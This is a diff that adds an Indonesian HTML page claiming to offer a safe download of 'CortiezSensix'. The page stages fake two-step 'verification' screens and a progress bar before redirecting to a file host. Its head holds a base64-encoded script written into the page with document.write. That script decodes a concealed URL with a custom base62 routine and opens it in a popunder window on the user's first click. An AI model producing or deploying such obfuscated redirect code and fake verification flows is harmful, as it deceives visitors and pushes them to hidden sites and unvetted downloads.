@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Download CortiezSensix</title>
+<meta name="description" content="Download CortiezSensix secara aman.">
+
+<style>
+@font-face {
+  font-family: "GFFLatin";
+  src: url("https://cortiezapp.github.io/fonts/GFF-Latin-Thin.woff2") format("woff2");
+  font-weight: 100;
+}
+@font-face {
+  font-family: "GFFLatin";
+  src: url("https://cortiezapp.github.io/fonts/GFF-Latin-Regular.woff2") format("woff2");
+  font-weight: 400;
+}
+@font-face {
+  font-family: "GFFLatin";
+  src: url("https://cortiezapp.github.io/fonts/GFF-Latin-Medium.woff2") format("woff2");
+  font-weight: 500;
+}
+@font-face {
+  font-family: "GFFLatin";
+  src: url("https://cortiezapp.github.io/fonts/GFF-Latin-Bold.woff2") format("woff2");
+  font-weight: 700;
+}
+
+:root{
+  --bg: #0f1724;
+  --card: #0b1220;
+  --accent: #38bdf8;
+  --accent2: #7c3aed;
+  --text: #e6eef6;
+  --muted: #9aa4b2;
+  font-family: "GFFLatin", sans-serif;
+}
+
+body{
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(180deg,#071022,#081228);
+  color: var(--text);
+  font-family: "GFFLatin", sans-serif;
+}
+
+.box{
+  background: rgba(255,255,255,.03);
+  border: 1px solid rgba(255,255,255,.05);
+  padding: 28px;
+  border-radius: 16px;
+  text-align: center;
+  max-width: 360px;
+  width: 90%;
+  box-shadow: 0 10px 30px rgba(0,0,0,.5);
+  animation: fade .5s ease-out;
+}
+
+@keyframes fade{
+  from { opacity: 0; transform: translateY(14px); }
+  to { opacity: 1; transform: none; }
+}
+
+h1{
+  margin: 0 0 10px;
+  font-size: 22px;
+  font-weight: 500;
+}
+
+p{
+  color: var(--muted);
+  font-size: 14px;
+  margin: 8px 0;
+}
+
+.loader{
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  border: 4px solid rgba(255,255,255,.15);
+  border-top-color: var(--accent);
+  margin: 20px auto;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin{
+  to { transform: rotate(360deg); }
+}
+
+a.btn{
+  display: inline-block;
+  margin-top: 16px;
+  padding: 12px 18px;
+  border-radius: 12px;
+  text-decoration: none;
+  color: #012;
+  font-weight: 700;
+  background: linear-gradient(90deg, var(--accent), var(--accent2));
+  transition: opacity .3s;
+  cursor: pointer;
+}
+
+a.btn:hover{
+  opacity: .85;
+}
+
+/* Tambahan Style untuk Progress Bar sederhana */
+.progress-bg {
+  width: 100%;
+  background: rgba(255,255,255,0.1);
+  height: 8px;
+  border-radius: 10px;
+  margin: 20px 0;
+  overflow: hidden;
+  display: none;
+}
+.progress-fill {
+  height: 100%;
+  background: var(--accent);
+  width: 0%;
+}
+</style>
+
+<script>document.write(atob('PHNjcmlwdD5kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpeyhmdW5jdGlvbigpe2Z1bmN0aW9uIHRpYW5uZGV2X2I2MmQocyl7Y29uc3QgYz0iMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiO2xldCB2PUJpZ0ludCgwKTtmb3IobGV0IGk9MDtpPHMubGVuZ3RoO2krKyl2PXYqQmlnSW50KDYyKStCaWdJbnQoYy5pbmRleE9mKHNbaV0pKTtsZXQgYj1bXTt3aGlsZSh2PkJpZ0ludCgwKSl7Yi51bnNoaWZ0KE51bWJlcih2JkJpZ0ludCgyNTUpKSk7dj12Pj5CaWdJbnQoOCk7fXJldHVybiBuZXcgVGV4dERlY29kZXIoKS5kZWNvZGUobmV3IFVpbnQ4QXJyYXkoYikpO312YXIgdT10aWFubmRldl9iNjJkKCdKTGtHQ2JrTm1iYk5wVmRYTldCRE1ZWndiQlJWN0xhRkN5cXlwbWROWTBOM2VXa3F4UHVJSldJZ0J1RnZPRFRxQXdNS3lraXpPSVhDR3F0MUZLcUc0SVVVQnhEMUw3OUg0WGRxOEhnSlQyJyk7dmFyIG1heENvdW50PTEsY291bnRlcj0wO2Z1bmN0aW9uIHRpYW5uZGV2X3BvcHVuZGVyKCl7aWYoY291bnRlcj49bWF4Q291bnQpcmV0dXJuO2NvdW50ZXIrKztzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7d2luZG93Lm9wZW4odSwnX2JsYW5rJywnbm9vcGVuZXIsbm9yZWZlcnJlcicpO30sTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKjkwKSs3MCk7fWRvY3VtZW50LmJvZHkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLHRpYW5uZGV2X3BvcHVuZGVyKTt9KSgpO30pOzwvc2NyaXB0Pg=='));</script>
+</head>
+<body>
+
+<div class="box">
+  <h1 id="title">Verifikasi Step 1/2</h1>
+  <p id="desc">Klik tombol di bawah untuk memulai verifikasi file.</p>
+  
+  <div id="loader" class="loader" style="display:none;"></div>
+  
+  <div id="p-container" class="progress-bg">
+    <div id="p-fill" class="progress-fill"></div>
+  </div>
+
+  <a id="actionBtn" class="btn">Lanjutkan</a>
+</div>
+
+<script>
+const directDownload = "https://safefileku.com/download/Q5ANevrqJnHLb2Vw";
+const actionBtn = document.getElementById("actionBtn");
+const title = document.getElementById("title");
+const desc = document.getElementById("desc");
+const loader = document.getElementById("loader");
+const pContainer = document.getElementById("p-container");
+const pFill = document.getElementById("p-fill");
+
+let currentStep = 1;
+
+actionBtn.addEventListener("click", () => {
+  if (currentStep === 1) {
+    // Mulai Step 1
+    actionBtn.style.display = "none";
+    loader.style.display = "block";
+    desc.innerText = "Memproses permintaan Anda...";
+    
+    setTimeout(() => {
+      loader.style.display = "none";
+      title.innerText = "Verifikasi Step 2/2";
+      desc.innerText = "Hampir selesai! Klik sekali lagi untuk mengunduh.";
+      actionBtn.innerText = "Download Sekarang";
+      actionBtn.style.display = "inline-block";
+      currentStep = 2;
+    }, 2000);
+
+  } else if (currentStep === 2) {
+    // Jalankan Loading Akhir sebelum Link terbuka
+    actionBtn.style.display = "none";
+    pContainer.style.display = "block";
+    title.innerText = "Menyiapkan File...";
+    desc.innerText = "Mohon tunggu sebentar.";
+    
+    let width = 0;
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+        window.location.href = directDownload;
+        // Opsional: tampilkan tombol lagi jika redirect gagal
+        setTimeout(() => {
+          actionBtn.style.display = "inline-block";
+          actionBtn.href = directDownload;
+          pContainer.style.display = "none";
+        }, 1000);
+      } else {
+        width += 2;
+        pFill.style.width = width + "%";
+      }
+    }, 50);
+  }
+});
+</script>
+
+</body>
+</html>
